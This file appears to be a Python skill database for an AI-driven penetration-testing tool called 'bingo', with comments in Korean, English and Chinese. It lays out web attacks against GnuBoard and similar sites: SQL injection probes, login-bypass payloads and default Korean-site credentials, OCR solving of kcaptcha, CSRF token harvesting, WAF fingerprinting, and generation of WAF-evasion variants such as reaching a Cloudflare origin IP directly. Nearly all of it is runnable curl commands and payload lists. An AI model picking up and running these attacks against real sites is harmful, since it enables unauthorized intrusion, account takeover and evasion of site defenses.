"""
Pentest Precision 스킬 데이터 — bingo 내장
===========================================
AI 자동 선택 조건:
  - 웹 타겟 + 공격 의도
  - WAF 감지 (Cloudflare / ModSecurity / Nginx 406)
  - CAPTCHA 차단
  - 로그인 폼 / 게시판 폼 분석
  - False Positive 의심

EN: AI auto-selects when web target + WAF/CAPTCHA/form analysis needed.
ZH: 检测到WAF/CAPTCHA/表单分析需求时AI自动选择。
"""

SKILLS_DB_4: dict[str, dict] = {

"pentest-precision-fp": {
    "name": "False Positive 자동 제거",
    "module": "PentestPrecision",
    "tags": ["false-positive", "waf", "validation", "sqli", "time-based", "union", "boolean"],
    "desc": (
        "WAF silent-block vs 실제 취약점 자동 판별. "
        "에러 키워드 / 시간 지연 / UNION 마커 / 응답 길이 차이로 검증. "
        "기존 bingo/AI 결과에서 오탐 제거.\n"
        "EN: Auto-detect false positives from WAF or normal responses via error keywords, "
        "time delay, UNION marker, and length diff.\n"
        "ZH: 通过错误关键词、时间延迟、UNION标记、响应长度自动识别误报。"
    ),
    "tools": ["pentest_precision.check_false_positive", "burpsuite", "curl"],
    "commands": [
        # 시간 기반 검증 — 3회 측정 평균
        "time curl -s 'URL?id=1' > /dev/null",
        "time curl -s \"URL?id=1' AND SLEEP(3)--\" > /dev/null",
        # 에러 기반 검증
        "curl -s \"URL?id=1'\" | grep -iE 'sql|syntax|error|warning|mysql'",
        # UNION 마커 검증
        "curl -s \"URL?id=-1 UNION SELECT 1,0xDEADBEEF,3--\" | grep 'DEADBEEF'",
        # 길이 비교
        "curl -sI 'URL?id=1' | grep Content-Length",
        "curl -sI \"URL?id=1 AND 1=2\" | grep Content-Length",
    ],
    "payloads": [],
    "notes": (
        "판별 기준:\n"
        "  ERROR-BASED: 실제 SQL 에러 메시지(mysql_error/syntax error/ORA-) 必須\n"
        "  TIME-BASED : payload RTT >= baseline × 2.5 AND 절대값 ≥ 2.5초\n"
        "  UNION      : 마커 문자열이 응답에 verbatim 존재\n"
        "  BOOLEAN    : 응답 길이 차이 ≥ 50 bytes\n"
        "WAF 차단 시그니처: 'access denied','not acceptable','blocked','차단' → 즉시 False Positive"
    ),
},

"pentest-precision-captcha": {
    "name": "CAPTCHA 자동 우회 (ddddocr)",
    "module": "PentestPrecision",
    "tags": ["captcha", "ocr", "ddddocr", "kcaptcha", "gnuboard", "bypass", "form"],
    "desc": (
        "ddddocr로 CAPTCHA 이미지 자동 OCR. "
        "GnuBoard kcaptcha 전용 세션 순서(session.php → image.php → OCR) 자동 처리.\n"
        "EN: Auto-solve CAPTCHA via ddddocr OCR. Handles GnuBoard kcaptcha session order.\n"
        "ZH: 通过ddddocr自动识别验证码。处理GnuBoard kcaptcha的session顺序。"
    ),
    "tools": ["pentest_precision.fetch_gnuboard_captcha", "pentest_precision.solve_captcha_ddddocr"],
    "commands": [
        "pip install ddddocr",
        # GnuBoard kcaptcha 순서
        "curl -s 'https://TARGET/bbs/captcha/kcaptcha_session.php?bo_table=consult'  # ← uid 획득",
        "curl -s 'https://TARGET/bbs/captcha/kcaptcha_image.php?uid=UID&bo_table=consult' -o captcha.png",
        "python3 -c \"import ddddocr; ocr=ddddocr.DdddOcr(show_ad=False); print(ocr.classification(open('captcha.png','rb').read()))\"",
    ],
    "payloads": [],
    "notes": (
        "⚠️ 순서 필수: kcaptcha_session.php 먼저 → uid 획득 → kcaptcha_image.php?uid=UID\n"
        "uid를 kcaptcha_result.php로 검증하면 빈 응답 → 직접 OCR 후 폼에 삽입\n"
        "같은 세션(PHPSESSID)으로 session → image → form submit까지 유지 필수"
    ),
},

"pentest-precision-token": {
    "name": "세션/토큰 정확 추출",
    "module": "PentestPrecision",
    "tags": ["token", "csrf", "session", "hidden-field", "gnuboard", "write_token", "extract"],
    "desc": (
        "GnuBoard write_token.php JSON 응답에서 'token' 키로 추출 (오탐: 'write_token'). "
        "HTML form hidden 필드 전체 자동 추출.\n"
        "EN: Extract write token from JSON key 'token' (not 'write_token'). Auto-extract hidden fields.\n"
        "ZH: 从JSON的'token'键提取写入令牌（非'write_token'）。自动提取hidden字段。"
    ),
    "tools": ["pentest_precision.extract_write_token", "pentest_precision.extract_hidden_fields"],
    "commands": [
        "curl -s 'https://TARGET/bbs/write_token.php?bo_table=TABLE' | python3 -c \"import sys,json; print(json.load(sys.stdin)['token'])\"",
        "curl -s 'https://TARGET/bbs/write.php?bo_table=TABLE' | grep -oP 'name=\"[^\"]+\" value=\"[^\"]*\"'",
    ],
    "payloads": [],
    "notes": (
        "write_token.php 응답 JSON 키: 'token' (NOT 'write_token')\n"
        "PHPSESSID 스코프: 서브도메인이 다르면 쿠키가 공유 안 됨 → 같은 도메인으로만 요청\n"
        "세션 일관성: opener(CookieJar) 하나로 session.php → token → submit 전체 처리"
    ),
},

"pentest-precision-fingerprint": {
    "name": "기술 스택 핑거프린팅 (버전 포함)",
    "module": "PentestPrecision",
    "tags": ["fingerprint", "cms", "waf", "php", "version", "recon", "stack"],
    "desc": (
        "HTTP 헤더 + HTML body로 CMS/WAF/PHP/Framework 버전 자동 탐지. "
        "WAF 종류별 우회 전략 자동 추천.\n"
        "EN: Auto-detect CMS/WAF/PHP/Framework version from headers+HTML. Recommend bypass strategy.\n"
        "ZH: 从响应头和HTML自动检测CMS/WAF/PHP/Framework版本并推荐绕过策略。"
    ),
    "tools": ["pentest_precision.fingerprint", "pentest_precision.auto_analyze"],
    "commands": [
        "curl -sI 'https://TARGET/' | grep -iE 'server|x-powered|cf-ray|x-sucuri'",
        "curl -s 'https://TARGET/' | grep -iE 'gnuboard|wordpress|drupal|rhymix|xe_'",
        "python3 -c \"from bingo.tools.pentest_precision import auto_analyze; auto_analyze('https://TARGET/')\"",
    ],
    "payloads": [],
    "notes": (
        "WAF별 추천 우회:\n"
        "  Cloudflare   → SPF IP 직접 접근, /**/, %0a\n"
        "  Nginx 406    → %09, multipart, chunked encoding\n"
        "  ModSecurity  → HPP, 이중 URL 인코딩, /*!50000SELECT*/\n"
        "CMS별 공격 포인트:\n"
        "  GnuBoard5    → write_token CSRF, kcaptcha, /adm/ 브루트포스\n"
        "  WordPress    → xmlrpc.php, /wp-admin/, plugin 취약점\n"
        "  Rhymix/XE    → module=admin IDOR, file upload"
    ),
},

"pentest-precision-login": {
    "name": "로그인 공격 정확 판별",
    "module": "PentestPrecision",
    "tags": ["login", "bruteforce", "sqli", "auth-bypass", "session", "gnuboard", "korea"],
    "desc": (
        "로그인 성공/실패 정확 판별 + SQLi 우회 페이로드 + 한국 사이트 특화 크리덴셜. "
        "GnuBoard login_check.php 전용 흐름 포함.\n"
        "EN: Accurate login success detection + SQLi auth bypass + Korea-specific credentials.\n"
        "ZH: 准确判断登录成功失败+SQLi认证绕过+韩国网站特有凭据。"
    ),
    "tools": ["pentest_precision.check_login_success"],
    "commands": [
        # GnuBoard 로그인
        "curl -sL -c cookies.txt -b cookies.txt -X POST 'https://TARGET/bbs/login_check.php' "
        "-d 'mb_id=admin&mb_password=admin1234&url=/'",
        # SQLi 우회
        "curl -sL -c cookies.txt -X POST 'https://TARGET/bbs/login_check.php' "
        "-d \"mb_id=admin' OR '1'='1&mb_password=x\"",
        # 성공 확인
        "curl -s -b cookies.txt 'https://TARGET/bbs/member.php' | grep -E '로그아웃|마이페이지|mb_id'",
    ],
    "payloads": [
        # SQLi 인증 우회
        "admin' OR '1'='1'--",
        "admin'/**/OR/**/'1'='1'--",
        "admin' OR 1=1#",
        "' UNION SELECT 1,'admin','$2y$10$fakehash',4,5,6,7,8,9,10--",
        # 한국 사이트 크리덴셜
        "admin:admin1234", "admin:qwer1234", "admin:1234",
        "admin:gnuboard", "webmaster:webmaster",
    ],
    "notes": (
        "성공 판별 로직:\n"
        "  1. 응답에 실패 키워드('아이디 또는 비밀번호','틀') → 무조건 실패\n"
        "  2. 응답에 '로그아웃','마이페이지' 또는 쿠키에 ck_mb_id → 성공\n"
        "  3. 최종 URL이 login_check.php가 아니고 login 미포함 → 성공 가능성\n"
        "GnuBoard 특성: SHA512 + salt → 평문 SQLi 우회 어려움 → 관리자 패널 직접 공략 권장"
    ),
},

"pentest-precision-waf-bypass": {
    "name": "WAF 우회 자동 변형 생성",
    "module": "PentestPrecision",
    "tags": ["waf-bypass", "encoding", "hpp", "comment", "obfuscation", "sqli", "xss"],
    "desc": (
        "기본 페이로드에서 WAF 우회 변형 자동 생성. "
        "공백 치환 / 대소문자 혼합 / URL 인코딩 / 인라인 주석 / HPP.\n"
        "EN: Auto-generate WAF bypass variants: space sub, case mix, URL encode, inline comment, HPP.\n"
        "ZH: 自动生成WAF绕过变体：空格替换、大小写混合、URL编码、内联注释、HPP。"
    ),
    "tools": ["pentest_precision.waf_bypass_variants"],
    "commands": [
        "python3 -c \"from bingo.tools.pentest_precision import waf_bypass_variants; "
        "[print(v) for v in waf_bypass_variants(\\\"' OR 1=1--\\\")]\"",
        # 수동 변형 예시
        "' OR/**/1=1--",
        "'%20OR%201=1--",
        "' OR%0a1=1--",
        "'+OR+1=1--",
        "'/*!OR*/1=1--",
    ],
    "payloads": [
        "' OR/**/1=1--",
        "'%09OR%091=1--",
        "' OR%0a1=1--",
        "' OR+1=1--",
        "' oR '1'='1",
        "/*!50000' OR '1'='1*/--",
    ],
    "notes": (
        "우회 기법 우선순위 (실전 기준):\n"
        "  1순위: /**/ 공백 치환 (가장 범용)\n"
        "  2순위: %0a (줄바꿈) — Nginx 406 효과적\n"
        "  3순위: HPP — id=1&id=' OR 1=1--\n"
        "  4순위: 이중 URL 인코딩 — %2527 (% → %25)\n"
        "  5순위: 인라인 주석 — SE/*!LECT\n"
        "Cloudflare: 클라우드플레어 레이어 우회 위해 SPF 레코드로 실제 IP 확인 후 직접 접근"
    ),
},

}  # SKILLS_DB_4 end


MODULE_INDEX_4: dict[str, list[str]] = {
    "PentestPrecision": list(SKILLS_DB_4.keys()),
    "SecSkills-Web":     list(SKILLS_DB_4.keys()),  # 기존 모듈과 연결
}

TAG_INDEX_4: dict[str, list[str]] = {}
for _sid, _sdata in SKILLS_DB_4.items():
    for _tag in _sdata.get("tags", []):
        if _tag not in TAG_INDEX_4:
            TAG_INDEX_4[_tag] = []
        TAG_INDEX_4[_tag].append(_sid)
